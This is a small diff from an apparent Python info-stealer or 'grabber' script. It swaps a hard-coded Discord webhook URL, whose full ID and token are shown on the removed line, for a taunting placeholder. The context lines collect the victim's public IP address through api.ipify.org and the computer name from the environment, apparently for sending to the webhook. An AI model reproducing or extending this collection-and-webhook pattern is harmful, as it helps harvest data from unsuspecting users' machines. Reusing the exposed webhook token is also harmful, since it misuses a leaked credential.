@@ -9,7 +9,7 @@ import os
  
 __author__ = "xpierroz" # Might add an anti-skid but i have to munch things to do rn
 
-discord_webhook = "https://canary.discord.com/api/webhooks/1096512293048697014/k00SuViD_Lcp-jyRbl56IBBMcZOKpsNU7ggdHz7mZN2Ewc_lSk9zmtznmA6g8BmfbQiy"
+discord_webhook = "xpierroz on top"
 
 __r = requests.get('https://api.ipify.org/').text
 __c = os.getenv('COMPUTERNAME')
